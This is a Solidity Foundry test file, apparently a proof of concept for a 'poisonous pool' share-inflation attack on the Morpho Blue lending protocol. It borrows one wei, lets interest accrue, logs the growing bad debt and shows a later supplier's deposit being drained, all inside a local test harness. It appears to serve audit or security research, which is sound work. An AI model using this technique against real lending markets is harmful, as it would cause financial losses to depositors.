// SPDX-License-Identifier: None

// before running please
// 1. replace mock irm with real adaptive irm

pragma solidity ^0.8.0;

import "../lib/morpho-blue/test/forge/BaseTest.sol";

contract PoisonousPoolIntegrationTest is BaseTest {
    using SharesMathLib for uint256;
    using MarketParamsLib for MarketParams;
    using MorphoLib for IMorpho;
    using MorphoBalancesLib for IMorpho;

    int256 internal constant CURVE_STEEPNESS = 4 ether;
    int256 internal constant ADJUSTMENT_SPEED = int256(50 ether) / 365 days;
    int256 internal constant TARGET_UTILIZATION = 0.9 ether;
    int256 internal constant INITIAL_RATE_AT_TARGET = int256(0.01 ether) / 365 days;

    function setUp() public override {
        super.setUp();

        deployCodeTo(
            "AdaptiveCurveIrm.sol",
            abi.encode(address(morpho), CURVE_STEEPNESS, ADJUSTMENT_SPEED, TARGET_UTILIZATION, INITIAL_RATE_AT_TARGET),
            address(irm)
        );
    }

    function testPoison() public {
        collateralToken.setBalance(address(this), 1e18);
        loanToken.setBalance(address(this), 1);

        morpho.supplyCollateral(marketParams, 1e18, address(this), hex"");
        morpho.supply(marketParams, 1, 0, address(this), hex"");
        morpho.borrow(marketParams, 1, 0, address(this), address(this));

        Market memory market = morpho.market(marketParams.id());
        console2.log(
            "bad debt: %e",
            SharesMathLib.VIRTUAL_SHARES.toAssetsDown(market.totalBorrowAssets, market.totalBorrowShares)
                - SharesMathLib.VIRTUAL_ASSETS
        );

        skip(65 days);

        morpho.accrueInterest(marketParams);

        market = morpho.market(marketParams.id());
        console2.log(
            "bad debt: %e",
            SharesMathLib.VIRTUAL_SHARES.toAssetsDown(market.totalBorrowAssets, market.totalBorrowShares)
                - SharesMathLib.VIRTUAL_ASSETS
        );

        uint256 borrowed = uint256(1e6).toAssetsUp(market.totalBorrowAssets, market.totalBorrowShares);
        loanToken.setBalance(address(this), borrowed);

        morpho.repay(marketParams, 0, 1e6, address(this), hex"");
        morpho.withdrawCollateral(marketParams, 1e18, address(this), address(this));

        for (uint256 i; i < 13; ++i) {
            skip(5 days);

            morpho.accrueInterest(marketParams);

            market = morpho.market(marketParams.id());
            console2.log(
                "bad debt: %e",
                SharesMathLib.VIRTUAL_SHARES.toAssetsDown(market.totalBorrowAssets, market.totalBorrowShares)
                    - SharesMathLib.VIRTUAL_ASSETS
            );
        }

        loanToken.setBalance(SUPPLIER, type(uint160).max);

        vm.prank(SUPPLIER);
        (uint256 assetsV, uint256 sharesV) = morpho.supply(marketParams, 0, 1e6, SUPPLIER, hex"");

        morpho.withdraw(marketParams, 0, 1e6, address(this), address(this));

        assertEq(loanToken.balanceOf(address(this)), borrowed);
    }
}
